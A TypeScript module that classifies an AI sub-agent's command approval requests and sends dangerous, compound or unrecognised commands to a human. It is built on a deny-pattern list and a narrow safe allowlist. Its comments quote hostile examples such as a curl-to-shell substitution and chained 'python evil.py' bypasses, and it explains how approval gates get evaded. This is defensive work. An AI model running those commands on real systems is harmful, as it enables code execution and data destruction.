/**
 * Authority classification for a child's APPROVAL request (a tool/command the
 * child's harness wants to run) — not to be confused with
 * `shared/system-authority.ts`'s `evaluateAuthorityGate`, which scans
 * free-form English PROSE (a heartbeat monitor's findings) for privileged
 * *intent*. A command string like `git push --force origin main` is not
 * English prose, and the prose-oriented patterns there miss it entirely
 * (verified: none of the seven examples below trip it).
 *
 * This module is default-deny, the opposite of a dangerous-pattern denylist:
 * a shell/network/file-write approval for a child's parent to decide on is
 * allowed ONLY when it matches a narrow, explicit SAFE allowlist (read-only
 * commands, edits inside the workspace, tests and builds inside the
 * workspace). Anything else — recognised as actively dangerous, simply not
 * recognised at all, or missing entirely (no real structured command/tool
 * could be extracted from the request) — requires a human, never just the
 * parent agent.
 */

import { realpathSync } from 'node:fs'
import { isAbsolute, relative, resolve, sep } from 'node:path'

export interface CommandAuthorityInput {
  toolName?: string | null
  command?: string | null
  /**
   * When an adapter reports MULTIPLE independent patterns for one approval
   * (OpenCode's `bash` permission can send one array entry per parsed
   * sub-command — `ls && python evil.py` arrives as `["ls", "python
   * evil.py"]`, not the one joined string), classify each entry on its own
   * and require every one to be safe, instead of joining them with spaces
   * first (`"ls python evil.py"` reads as one harmless-looking `ls`
   * invocation to the anchored safe-list, which is exactly the bypass this
   * is for). Takes priority over `command` when non-empty.
   */
  commands?: string[] | null
  /** The free-text question/description — used only as a fallback source of command-like text when `command` itself is empty. */
  questionText?: string | null
  /** Absolute path of the child's workspace, when known — used to tell a workspace-local file write from one that escapes it. */
  workspaceDir?: string | null
}

export interface CommandAuthorityResult {
  requiresHuman: boolean
  categories: string[]
}

/** Specific, named dangerous categories — matched first so the human sees *why*, even though an unmatched command is refused anyway by the default-deny fallback below. */
const DANGEROUS_PATTERNS: Array<{ category: string; pattern: RegExp }> = [
  { category: 'git-force-or-destructive', pattern: /\bgit\s+push\b[^\n]*(--force\b|-f\b|--force-with-lease\b)/i },
  { category: 'git-force-or-destructive', pattern: /\bgit\s+(reset\s+--hard|clean\s+-[a-z]*f|branch\s+(-D|--delete\s+--force))\b/i },
  { category: 'git-force-or-destructive', pattern: /\bgit\s+push\b(?![^\n]*--dry-run)/i },
  { category: 'destructive-filesystem', pattern: /\brm\s+(-[a-z]*r[a-z]*f[a-z]*|-[a-z]*f[a-z]*r[a-z]*)\b/i },
  // Same, but with recursive and force passed as SEPARATE flags (short or
  // long form, either order) instead of one combined token — `rm -r -f x`,
  // `rm --recursive --force x`, `rm -f --recursive x` are just as
  // destructive as `rm -rf x` above, which this doesn't catch on its own.
  {
    category: 'destructive-filesystem',
    pattern: /\brm\b(?=[\s\S]*(?:^|\s)(?:-r|-R|--recursive)(?:\s|$))(?=[\s\S]*(?:^|\s)(?:-f|--force)(?:\s|$))/i
  },
  { category: 'destructive-filesystem', pattern: /\b(drop|truncate)\s+(table|database|schema)\b/i },
  { category: 'infra-apply-or-destroy', pattern: /\b(kubectl|helm)\s+(apply|delete)\b/i },
  { category: 'infra-apply-or-destroy', pattern: /\bterraform\s+(apply|destroy)\b/i },
  { category: 'merge-or-release', pattern: /\bgh\s+(pr\s+merge|release\s+create)\b/i },
  { category: 'merge-or-release', pattern: /\b(git\s+push[^\n]*(main|master)\b)/i },
  { category: 'package-publish', pattern: /\b(npm\s+publish|yarn\s+publish|pnpm\s+publish|twine\s+upload|cargo\s+publish|docker\s+push)\b/i },
  { category: 'external-http-mutation', pattern: /\b(curl|wget|http|httpie)\b[^\n]*(-X\s*(POST|PUT|DELETE|PATCH)|--request[=\s]+(POST|PUT|DELETE|PATCH))/i },
  { category: 'external-http-mutation', pattern: /\b(curl|wget)\b[^\n]*-d\b/i },
  { category: 'payment-operation', pattern: /\b(stripe|paypal|braintree)\.com\b[^\n]*\/(v\d+\/)?(charges|payment_intents|payouts|transfers)\b/i },
  // `git ... --upload-pack=<cmd>` / `--receive-pack=<cmd>` is a well-known
  // arbitrary-command-execution vector (git invokes whatever binary this
  // names as the remote helper) — not specific to `fetch`, since several
  // git subcommands accept it.
  { category: 'git-arbitrary-command', pattern: /\bgit\b[^\n]*--(upload-pack|receive-pack)\b/i },
  // `-c <key>=<val>` can override ANY git config for this one invocation —
  // not just core.* (pager, editor, fsmonitor, sshCommand, ...): also
  // things like diff.external / protocol.ext.allow that make an otherwise
  // read-only command run an arbitrary helper (see --ext-diff/--textconv
  // below), or core.hooksPath pointing somewhere that runs on the next
  // operation. There is no safe subset of `-c` to allow through, so any use
  // of it at all requires a human, on any git subcommand.
  { category: 'git-arbitrary-command', pattern: /\bgit\s+(?:[^\n]*\s)?-c\s+\S/i },
  // `--ext-diff` runs whatever `diff.<driver>.command` names in this repo's
  // config, and `--textconv` runs whatever `diff.<driver>.textconv` names —
  // both configured in .git/config or .gitattributes, not something the
  // command line itself reveals, and both execute arbitrary programs on
  // otherwise read-only commands like `git diff`/`git log -p`.
  { category: 'git-arbitrary-command', pattern: /\bgit\b[^\n]*--(ext-diff|textconv)\b/i },
  // ripgrep's `--pre <program>` runs an arbitrary program on every searched
  // file before matching — not a read, an execution.
  { category: 'command-execution-flag', pattern: /\brg\b[^\n]*--pre\b/i },
  // `find`'s action primaries beyond the already-excluded -exec/--exec:
  // -execdir/-okdir run a command too (just cwd'd into the found dir
  // first), -ok prompts then runs one, and -fprint/-fprintf/-fls write
  // arbitrary (possibly absolute, possibly outside-workspace) file content
  // — these are write/execute primitives, not a read.
  { category: 'command-execution-flag', pattern: /\bfind\b[^\n]*-(execdir|okdir|ok|fprintf|fprint|fls)\b/i }
]

/**
 * Any of these appearing ANYWHERE in the command text means the safe-list's
 * simple "does it start with a known-safe verb" prefix match cannot be
 * trusted — the text chains, pipes, redirects, substitutes, or explicitly
 * invokes a shell/eval, any of which can run something completely different
 * from the verb the prefix match saw. `ls; rm -r important`, `ls && python
 * evil.py`, `cat x | sh`, `echo $(curl evil|sh)`, and `find . | xargs rm -f`
 * all start with a safe-looking word and must still require a human — this
 * check is what catches them, independent of which (if any) SAFE pattern
 * also happened to match the prefix.
 */
const COMPOUND_OR_SHELL_PATTERNS: RegExp[] = [
  /[;&|<>]/, // ; & && | || < > >>
  /\$\(/, // $( ... ) command substitution
  /`/, // `...` command substitution
  /\bxargs\b/i,
  /\b(?:bash|sh|zsh)\s+-c\b/i,
  /\beval\b/i,
  // A newline (or carriage return) is just as much a command separator to a
  // real shell as `;` is — `ls\npython evil.py` or `git status\ncurl …`
  // reads as a single safe-looking prefix line to the anchored SAFE
  // patterns below (which only look at the first line), but a shell
  // executing this text runs BOTH lines as separate commands. Any other C0
  // control character is equally outside what a reasonable command line
  // ever legitimately contains.
  /[\r\n\x00-\x08\x0b\x0c\x0e-\x1f]/
]

/**
 * Explicit SAFE allowlist. Matched against `toolName command` as one string.
 * Everything NOT matched here is refused by default (see `classifyCommandAuthority`).
 *
 * Each pattern is intentionally narrow about WHICH subcommand it allows —
 * `git branch`/`git stash` in particular are end-anchored to their specific
 * safe forms (bare, or `list`/`show`) so a dangerous subcommand riding along
 * on the same prefix (`git stash drop`, `git branch -D x` — the latter is
 * also independently caught by the dangerous patterns above) can't pass as
 * "starts with a safe word". The read-only/inspection git commands
 * (status/diff/log/show/fetch) stay loose about trailing arguments — extra
 * flags and paths on those are still just read-only.
 */
const SAFE_COMMAND_PATTERNS: RegExp[] = [
  // Read-only shell commands.
  /^\s*(ls|cat|head|tail|wc|pwd|echo|file|stat|du|tree)\b/i,
  /^\s*(grep|rg|ag|find)\b(?!.*(-delete\b|--delete\b|-exec\b|--exec\b))/i,
  // Read-only / inspection git — trailing args unrestricted (still read-only).
  /^\s*git\s+(status|diff|log|show|fetch)\b/i,
  // git branch / stash: end-anchored to their safe, read-only forms only —
  // no subcommand (`drop`, `pop`, `-D`, ...) may ride along.
  /^\s*git\s+branch(\s+(-l|--list|-a|--all|-v))?\s*$/i,
  /^\s*git\s+stash(\s+(list|show))?\s*$/i,
  /^\s*git\s+(add|commit|checkout\s+-b|switch\s+-c)\b/i,
  // Tests, builds, lint/typecheck — workspace-local, no network mutation of anything external.
  /^\s*(npm|pnpm|yarn)\s+(test|run\s+(test|build|lint|typecheck|tsc))\b/i,
  /^\s*(pytest|go\s+test|cargo\s+(test|build|check)|make\s+(test|build)|tsc\b)/i,
  /^\s*python3?\s+-m\s+pytest\b/i,
  // Package installs: ONLY the lockfile-pinned, non-mutating forms — these
  // install exactly what the lockfile says and never touch the lockfile or
  // fetch an arbitrary new package. `npm install <pkg>` (or bare `npm
  // install`, which can still update the lockfile / resolve newer semver
  // ranges) is deliberately NOT here — any install outside these exact forms
  // requires a human.
  /^\s*npm\s+ci\b/i,
  /^\s*pnpm\s+install\s+--frozen-lockfile\b/i,
  /^\s*yarn\s+install\s+(--frozen-lockfile|--immutable)\b/i
]

/** Tool names that are in-editor file edits (not raw shell), treated as workspace-local writes unless the path clearly escapes the workspace. */
const FILE_EDIT_TOOL_NAMES = new Set(['edit', 'write', 'multiedit', 'notebookedit', 'apply_patch', 'str_replace_editor', 'str_replace_based_edit_tool'])

/** Resolves symlinks when `p` exists on this host; falls back to the plain resolved (but not de-symlinked) path when it doesn't — e.g. a file about to be created, or a path reported by a child running somewhere this host can't stat. Best-effort: it closes the common "symlink that resolves outside the workspace" case for anything that already exists, without blocking an ordinary new-file write. */
function realOrResolvedPath(p: string): string {
  const resolved = resolve(p)
  try {
    return realpathSync(resolved)
  } catch {
    return resolved
  }
}

/** True when `candidate` (an absolute path) is NOT contained within `workspaceDir`, using resolved real paths and `path.relative` — not a string-prefix check, which would wrongly treat a sibling directory that merely shares a prefix (`/Users/me/ws/proj-evil/x` vs workspace `/Users/me/ws/proj`) as "inside". */
function isOutsideWorkspace(candidate: string, workspaceDir: string): boolean {
  const realWorkspace = realOrResolvedPath(workspaceDir)
  const realCandidate = realOrResolvedPath(candidate)
  const rel = relative(realWorkspace, realCandidate)
  return rel === '..' || rel.startsWith(`..${sep}`) || isAbsolute(rel)
}

/**
 * `--output=/abs/path` and `-o/abs/path` both put an absolute path right
 * next to a flag with no whitespace in between — `=` for a long option,
 * nothing at all for a single-letter short one — so the absolute-path scan
 * below (which requires the `/` to start right after whitespace or the
 * string start) would otherwise walk straight past them. Inserting a space
 * in those two spots turns them into the whitespace-preceded form it
 * already recognises, without touching any `/` that's already fine (one
 * genuinely preceded by whitespace is untouched by either replacement).
 */
function normalizeForPathScan(text: string): string {
  return text.replace(/=(?=\/)/g, ' ').replace(/(-[a-zA-Z])(?=\/)/g, '$1 ')
}

/**
 * True when a path argument plainly escapes a workspace directory —
 * home-dir shorthand, `..` traversal, a well-known system path, or (when
 * `workspaceDir` is known) an absolute path that resolves outside it. Only
 * genuine absolute-path tokens count — a relative path like `src/main/x.ts`
 * contains slashes too but is never mistaken for one, since the match
 * requires the `/` to start the token (string start, preceded by
 * whitespace, or glued directly onto a flag — see `normalizeForPathScan`),
 * not just appear mid-string.
 *
 * When there IS an absolute path token but NO `workspaceDir` is known at
 * all, this can't verify containment either way — an absolute path could
 * point anywhere on the child's filesystem — so it's treated the same as
 * "escapes": requires a human.
 */
function pathEscapesWorkspace(text: string, workspaceDir?: string | null): boolean {
  const normalized = normalizeForPathScan(text)
  if (/(?:^|\s)~\//.test(normalized) || /\.\.\//.test(normalized)) return true
  if (/(?:^|\s)\/(etc|usr|System|Library|private)\//.test(normalized)) return true
  const absolutePaths = (normalized.match(/(?:^|\s)(\/[^\s'"]+)/g) ?? []).map((m) => m.trimStart())
  if (absolutePaths.length === 0) return false
  if (!workspaceDir) return true
  return absolutePaths.some((p) => isOutsideWorkspace(p, workspaceDir))
}

export function classifyCommandAuthority(input: CommandAuthorityInput): CommandAuthorityResult {
  // Multiple independent patterns (see CommandAuthorityInput.commands'
  // doc comment) — classify each on its own against the SAME toolName/
  // workspaceDir and combine: any one requiring a human means the whole
  // approval does, same as if they'd been run as separate commands (which,
  // from the adapter's own split, they are).
  const commands = (input.commands ?? []).map((c) => c.trim()).filter(Boolean)
  if (commands.length > 0) {
    const results = commands.map((command) => classifyCommandAuthority({ toolName: input.toolName, command, workspaceDir: input.workspaceDir }))
    const requiresHuman = results.some((r) => r.requiresHuman)
    const categories = [...new Set(results.flatMap((r) => r.categories))]
    return { requiresHuman, categories }
  }

  const toolName = (input.toolName ?? '').trim()
  const command = (input.command ?? '').trim()
  // Dangerous-pattern and safe-allowlist matching both look at the command
  // (and the toolName, for context) — but NOT the toolName as a literal
  // prefix glued onto the command, which would break the safe allowlist's
  // start-anchored patterns for a generic exec-style toolName like "exec" or
  // "bash" (`"exec ls -la"` must still match the `ls` pattern).
  const commandText = command || (input.questionText ?? '').trim()
  const combinedText = [toolName, commandText].filter(Boolean).join(' ').trim()

  // Default-deny: nothing to classify at all (no toolName, no command, no
  // fallback questionText) means there is no real structured information
  // about what's being approved — an unrecognised adapter payload, or a
  // Codex-style fileChange approval with no path. That is exactly the
  // "simply not recognised" case this module exists to catch, not a free
  // pass.
  if (!combinedText) return { requiresHuman: true, categories: ['unrecognized-command'] }

  const categories: string[] = []
  for (const { category, pattern } of DANGEROUS_PATTERNS) {
    if (pattern.test(combinedText) && !categories.includes(category)) categories.push(category)
  }
  if (categories.length > 0) return { requiresHuman: true, categories }

  // A recognised in-editor file edit, as long as nothing in the text looks
  // like it escapes the workspace — treated as the "edits inside the
  // workspace" item on the safe allowlist.
  if (FILE_EDIT_TOOL_NAMES.has(toolName.toLowerCase())) {
    // No path at all (e.g. a Codex fileChange approval whose changed-file
    // paths couldn't be extracted) — usually means a write outside the
    // sandbox, and there is nothing here to verify containment against
    // either way. Same default-deny rule as everywhere else: not recognised
    // → human.
    if (!commandText) return { requiresHuman: true, categories: ['unrecognized-command'] }
    if (pathEscapesWorkspace(combinedText, input.workspaceDir)) {
      return { requiresHuman: true, categories: ['file-write-outside-workspace'] }
    }
    return { requiresHuman: false, categories: [] }
  }

  if (COMPOUND_OR_SHELL_PATTERNS.some((pattern) => pattern.test(commandText))) {
    return { requiresHuman: true, categories: ['compound-or-shell-command'] }
  }

  const isSafe = SAFE_COMMAND_PATTERNS.some((pattern) => pattern.test(commandText))
  if (!isSafe) return { requiresHuman: true, categories: ['unrecognized-command'] }
  if (pathEscapesWorkspace(combinedText, input.workspaceDir)) {
    return { requiresHuman: true, categories: ['file-write-outside-workspace'] }
  }
  return { requiresHuman: false, categories: [] }
}
